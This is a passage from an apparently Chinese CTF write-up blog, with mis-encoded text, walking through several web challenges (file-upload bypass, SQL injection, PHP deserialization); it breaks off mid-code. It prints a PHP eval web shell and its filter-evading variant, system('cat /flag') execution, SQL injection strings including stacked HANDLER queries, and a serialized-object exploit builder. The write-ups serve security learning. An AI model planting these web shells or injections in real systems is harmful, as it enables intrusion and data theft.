(!is_numeric($passwd))</code><br>is_numeric()å‡½æ•°æ˜¯æ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—å­—ç¬¦ï¼Œæ˜¯åˆ™ture<br>è¿™é‡Œä¸º!is_numeric()ï¼Œå°±æ˜¯ä¸èƒ½å…¨ä¸ºæ•°å­—å­—ç¬¦<br>åŒæ—¶æˆ‘ä»¬çœ‹å‘ç¬¬äº”ä¸ªif<br><code>if($passwd==1234567)</code><br>ä¸ç¬¬å››ä¸ªifç›¸åï¼Œè¦åŒæ—¶æ»¡è¶³ä¸¤ä¸ªifæ¡ä»¶æ‰èƒ½è·å¾—flag<br>å…ˆè¯•ç€æŠŠ1234567è½¬åŒ–ä¸º16è¿›åˆ¶<br>passwd&#x3D;12D687<br>æäº¤ååªç»•è¿‡äº†ç¬¬å››ä¸ªifï¼Œä¸è¡Œ<br>ç™¾åº¦ä¸€ä¸‹å‘ç°<br><img src="/images/20210407185102246.png"><br>passwd:1234567%00<br>passwd:1234567%20<br>æˆåŠŸå¾—åˆ°flag<br><img src="/images/CJBVJ1.png"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>è¿›å…¥é¡µé¢ï¼Œå…ˆæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æºä»£ç é‡Œæœ‰æ³¨é‡Šyou are not admin<br>flagåº”è¯¥åœ¨adminä¸­ï¼Œçœ‹åˆ°å³è¾¹æœ‰registerå’Œloginï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªçœ‹çœ‹ä»€ä¹ˆæ•ˆæœ<br>ç™»å½•è¿›å»å‘ç°å¤šäº†å‡ ä¸ªé€‰é¡¹<br><img src="/images/GK.png"></p><p>æŒ¨ä¸ªæŸ¥çœ‹æºä»£ç <br><img src="/images/9DRO.png"><br>å‘ç°åœ¨change passwordä¸­çš„æºä»£ç ä¸å…¶ä»–ä¸åŒï¼Œæ˜¾ç¤ºäº†ä¸€ä¸ªgithubç½‘å€ï¼Œè¿›å…¥æŸ¥çœ‹ç½‘é¡µç«Ÿç„¶ä¸å­˜åœ¨ï¼Œé‚£å°±æ¢ä¸€ç§æ–¹æ³•ï¼Œregisteræ³¨å†Œä¸€ä¸ªadminï¼Œæ˜¾ç¤ºå·²è¢«æ³¨å†Œï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•è¯•ç›´æ¥login adminï¼Œå¯†ç éšæ„ï¼Œç«Ÿç„¶æˆåŠŸäº†<br><img src="/images/9WKWG.png"><br>æˆåŠŸæ˜¾ç¤ºflagï¼Œåç»­ä¼šè·Ÿè¿›å…¶ä»–æ–¹æ³•</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª.user.ini å†…å®¹ä¸ºauto_prepend_file&#x3D;12.txt<br>ä¸Šä¼ å¤±è´¥ï¼Œæ˜¾ç¤ºexif_imagetype:not image!ï¼Œæ²¡æœ‰å›¾åƒï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨æ–‡ä»¶å¹»æœ¯å¤´ç»•è¿‡<br><img src="/images/1UZPE.png"><br>å†æ¬¡ä¸Šä¼ ï¼ŒæˆåŠŸ<br><img src="/images/VT8D.png"><br>å†ä¸Šä¼ ä¸€ä¸ªå¸¸ç”¨çš„æœ¨é©¬æ–‡ä»¶<br>ä¸Šä¼ é”™è¯¯ï¼Œæ˜¾ç¤º&lt;? in contents!<br>å±è”½äº†ä¸€äº›ç¬¦å·å¯¼è‡´æ— æ³•ä¸Šä¼ <br>æ¢ç§æ–¹æ³•ä¸Šä¼ <br><img src="/images/8BNM.png"><br>è¿™æ¬¡æˆåŠŸä¸Šä¼ <br><img src="/images/G3.png"><br>è¿›å…¥ç»™å‡ºçš„åœ°å€<br>å…ˆè¾“å…¥a&#x3D;phpinfo()è¯•è¯•èƒ½ä¸èƒ½è¿è¡Œå‘½ä»¤<br><img src="/images/P45UMTRF.png"><br>æœ‰å›æ˜¾ï¼ŒæˆåŠŸæ‰§è¡Œ<br>ç»§ç»­post a&#x3D;system(â€œcat &#x2F;flagâ€)<br><img src="/images/U5SYBY1GKWV.png"><br>æˆåŠŸæ˜¾ç¤ºflag</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>ä¸Šä¼ .htaccess(ä»¥jpgå½¢å¼æŠ“åŒ…ä¿®æ”¹åç¼€å)<br><img src="/images/8HOSK.png"><br>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œè¿‡æ»¤äº†&lt;?<br>æ¢ä¸€ç§æ–¹å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ä»¥æ‰¾åˆ°flag</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>é¦–å…ˆåœ¨é¶æœºé¡µé¢é‡Œä»–ç»™äº†ä¸ªgithubç½‘å€ï¼Œè¿›å…¥åœ¨web&#x2F;babysqli&#x2F;html&#x2F;search.phpé‡Œæ‰¾åˆ°é‡è¦æºç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br><span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>echo <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¾“å…¥ä¸‡èƒ½é’¥åŒ™1â€™ or 1&#x3D;1#æ˜¾ç¤ºdo not hack me ä¸ä¸Šé¢å¯¹åº”ï¼Œé™åˆ¶äº†or</p><p>æŠ“åŒ…<br><img src="/images/L64.png"><br>è¿™é‡Œæ˜¾ç¤ºwrong user!<br>æŒ¨ä¸ªè¯•è¯•1ï¼Œ2ï¼Œ3çš„ä½ç½®ï¼ŒæŠŠå®ƒä»¬æ”¹ä¸ºâ€™adminâ€™ï¼Œåœ¨2ä½ç½®æ—¶å›æ˜¾å‘ç”Ÿäº†æ”¹å˜<br><img src="/images/N7R0.png"><br>wrong pass!<br>è·³è¿‡äº†userï¼Œé‚£ä¹ˆ3çš„ä½ç½®å°±æ˜¯passwordäº†<br>æ³¨æ„åˆ°ä¸Šé¢çš„ä»£ç ifä¸­æœ‰MD5ï¼Œä½¿ifæˆç«‹<br>è®¾å¯†ç ä¸ºabcï¼ŒMD5åŠ å¯†åä¸ºï¼š900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>è¾“å…¥  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png"><br>æ ¹æ®å­—é¢æ„æ€ï¼Œflagåº”è¯¥åœ¨FlagHereé‡Œ<br>è¾“å…¥  <code>1&#39;;cat FlagHere</code><br>æ²¡æœ‰æ˜¾ç¤º</p><p>è”åˆæ³¨å…¥<br>è¾“å…¥  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png"><br>æ˜¾ç¤ºäº†è¢«è¿‡æ»¤æ‰çš„å†…å®¹</p><p>å°è¯•åŒå†™ç»•è¿‡<br><code>1&#39;;sselectelect from FlagHere</code><br>ä¸é€šè¿‡</p><p>å°è¯•å¤§å°å†™ç»•è¿‡<br><code>1&#39;;sElECt from FlagHere;#</code><br>åŒæ ·ä¸é€šè¿‡</p><h4 id="handlerè¯­æ³•"><a href="#handlerè¯­æ³•" class="headerlink" title="handlerè¯­æ³•"></a>handlerè¯­æ³•</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>è¯­å¥ï¼Œä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥å¹¶ä¸å…·å¤‡<span class="hljs-keyword">select</span>è¯­å¥ä¸­çš„æ‰€æœ‰åŠŸèƒ½ã€‚<br>mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°<span class="hljs-keyword">sql</span>æ ‡å‡†ä¸­ã€‚<br><span class="hljs-keyword">handler</span>è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨<br></code></pre></td></tr></table></figure><ol><li>HANDLER tbl_name OPEN<br>æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</li><li>HANDLER tbl_name READ FIRST<br>è·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œï¼Œuiåä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</li><li>HANDLER tbl_name CLOSE<br>å…³é—­æ‰“å¼€çš„å¥æŸ„</li><li>HANDLER tbl_name READ index_name&#x3D;value<br>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</li></ol><p>è¾“å…¥</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><p><img src="/images/Q560M.png"><br>æˆåŠŸ</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç»è¿‡åˆ†æï¼Œè¿™ä¸ªé¢˜ç›®éœ€è¦ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„ç±»å¯¹è±¡ï¼Œå¹¶ä¸”è¦ç»•è¿‡ä¸¤å±‚é˜²æŠ¤ï¼š</p><p><strong>ä¸¤ä¸ªé˜²æŠ¤</strong></p><p><strong>is_valid()</strong><br>è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„strçš„æ¯ä¸ªå­—æ¯çš„ascliå€¼åœ¨32å’Œ125ä¹‹é—´ã€‚å› ä¸ºprotectedå±æ€§åœ¨åºåˆ—åŒ–ä¹‹åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦\00*\00,ä¸ç¬¦åˆä¸Šé¢çš„è¦æ±‚ã€‚</p><p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong>å› ä¸ºphp7.1ä»¥ä¸Šçš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ã€‚</p><p><strong>destruct()é­”æœ¯æ–¹æ³•</strong><br>op&#x3D;&#x3D;&#x3D;â€2â€ï¼Œæ˜¯å¼ºæ¯”è¾ƒ</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure><p>è€Œåœ¨process()å‡½æ•°ä¸­ï¼Œop&#x3D;&#x3D;â€2â€æ˜¯å¼±æ¯”è¾ƒ</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>            $<span class="hljs-keyword">this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ä½¿ä¼ å…¥çš„opä¸ºæ•°å­—2ï¼Œä»è€Œä½¿ç¬¬ä¸€ä¸ªå¼ºæ¯”è¾ƒè¿”å›falseï¼Œè€Œä½¿ç¬¬äºŒä¸ªå¼±æ¯”è¾ƒè¿”å›true</p><p><strong>æœ¬åœ°è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//å› ä¸ºdestruceå‡½æ•°ä¼šå°†contentæ”¹ä¸ºç©ºï¼Œæ‰€ä»¥contentçš„å€¼éšæ„ï¼ˆä½†æ˜¯è¦æ»¡è¶³is_valid()å‡½æ•°çš„è¦æ±‚ï¼‰</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span 